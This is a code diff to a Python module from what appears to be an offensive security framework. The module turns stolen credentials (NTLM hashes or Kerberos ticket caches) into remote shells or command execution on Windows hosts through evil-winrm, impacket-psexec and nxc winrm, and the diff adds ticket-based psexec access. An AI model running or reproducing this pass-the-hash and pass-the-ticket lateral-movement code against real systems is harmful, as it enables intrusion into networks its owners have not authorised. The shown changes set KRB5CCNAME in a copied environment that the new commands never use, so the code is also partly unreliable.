@@ -3,7 +3,8 @@ REQUIRES = ["creds"]
 
 def run(data, cred, args):
     import subprocess
-
+    import os
+    
     ip = data.get("ip")
     domain = data.get("domain")
 
@@ -17,7 +18,10 @@ def run(data, cred, args):
 
     user = cred.get("user")
     typ = cred.get("type")
-    secret = cred.get("secret")
+    secret = cred.get("secret") or cred.get("ccache")
+    hostname = data.get("hostname") or data.get("name")
+    
+    fqdn = f"{hostname}.{domain}" if domain else hostname
 
     cmd_input = getattr(args, "cmd", None)
 
@@ -34,8 +38,9 @@ def run(data, cred, args):
         base_cmd = f"evil-winrm -i {ip} -u {user} -H {secret}"
 
     elif typ == "ticket":
-        # assumes ccache path in secret
-        base_cmd = f"KRB5CCNAME={secret} evil-winrm -i {ip} -u {user} -k"
+        env = os.environ.copy()
+        env["KRB5CCNAME"] = secret    
+        base_cmd = f"impacket-psexec {domain}/{user}@{fqdn} -k -no-pass"
 
     else:
         print(f"[!] Unsupported credential type: {typ}")
@@ -55,11 +60,13 @@ def run(data, cred, args):
             full_cmd = f"nxc winrm {ip} -u {user} -H {secret} -X {safe_cmd} --no-progress"
 
         elif typ == "ticket":
-            full_cmd = f"KRB5CCNAME={secret} nxc winrm {ip} -u {user} --use-kcache -X {safe_cmd} --no-progress"
+            full_cmd = f"nxc winrm {fqdn} -u {user} --use-kcache -X {safe_cmd} --no-progress"
 
         else:
             print(f"[!] Unsupported credential type: {typ}")
             return
+
+        print(f"[+] Running: {full_cmd}")
 
         result = subprocess.run(
             full_cmd,
